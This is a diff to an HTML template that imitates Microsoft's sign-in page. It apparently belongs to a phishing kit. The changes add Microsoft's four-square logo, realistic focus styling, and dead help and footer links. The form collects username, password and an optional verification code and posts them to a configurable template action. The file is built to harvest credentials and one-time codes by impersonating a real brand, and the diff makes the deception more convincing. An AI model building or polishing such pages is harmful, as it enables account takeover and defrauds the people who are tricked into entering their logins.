@@ -5,30 +5,54 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Sign in to your account</title>
 <style>
+  * { box-sizing: border-box; }
   body { font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f2f2f2; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-  .card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 12px rgba(0,0,0,.16); }
-  .logo { font-size: 34px; font-weight: 600; color: #0078d4; margin-bottom: 8px; }
-  h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 24px; }
+  .card { background: #fff; width: 440px; max-width: 100%; padding: 44px; }
+  .brand { display: flex; align-items: center; margin-bottom: 24px; }
+  .squares { display: grid; grid-template-columns: 12px 12px; grid-gap: 2px; margin-right: 8px; }
+  .squares i { width: 12px; height: 12px; }
+  .sq1 { background: #f25022; } .sq2 { background: #7fba00; } .sq3 { background: #00a4ef; } .sq4 { background: #ffb900; }
+  .brandtext { font-size: 18px; font-weight: 400; color: #5e5e5e; }
+  h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 16px; }
   form { text-align: left; }
   label { font-size: 14px; color: #1b1b1b; display: block; margin-bottom: 6px; }
-  input { width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1px solid #666; border-radius: 2px; font-size: 15px; margin-bottom: 16px; }
+  input { width: 100%; padding: 10px 12px; border: 1px solid #666; border-radius: 2px; font-size: 15px; margin-bottom: 16px; }
+  input:focus { outline: none; border-color: #0067b8; box-shadow: 0 0 0 1px #0067b8 inset; }
   button { width: 100%; padding: 10px; border: 0; border-radius: 2px; background: #0067b8; color: #fff; font-size: 15px; cursor: pointer; }
   button:hover { background: #005a9e; }
+  .links { margin: 16px 0; font-size: 13px; color: #666; }
+  .links a { display: block; color: #0067b8; text-decoration: none; margin-bottom: 6px; }
+  .links a:hover { text-decoration: underline; }
+  .foot { display: flex; gap: 20px; font-size: 12px; color: #666; margin-top: 28px; }
+  .foot a { color: #666; text-decoration: none; }
+  .foot a:hover { text-decoration: underline; }
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="logo">Microsoft</div>
+  <div class="brand">
+    <span class="squares"><i class="sq1"></i><i class="sq2"></i><i class="sq3"></i><i class="sq4"></i></span>
+    <span class="brandtext">Microsoft</span>
+  </div>
   <h1>Sign in</h1>
   <form method="post" action="{{.Action}}">
     <input type="hidden" name="orig" value="{{.Orig}}">
     <label>Email, phone, or Skype</label>
     <input type="text" name="username" required autofocus>
     <label>Password</label>
-    <input type="password" name="password" required>
+    <input type="password" name="password" autocomplete="current-password" required>
     {{if .ShowOTP}}<label>Verification code</label><input type="text" name="otp" inputmode="numeric">{{end}}
     <button type="submit">Sign in</button>
   </form>
+  <div class="links">
+    <a href="#">No account? Create one!</a>
+    <a href="#">Forgot password?</a>
+    <a href="#">Sign in options</a>
+  </div>
+  <div class="foot">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+  </div>
 </div>
 </body>
 </html>
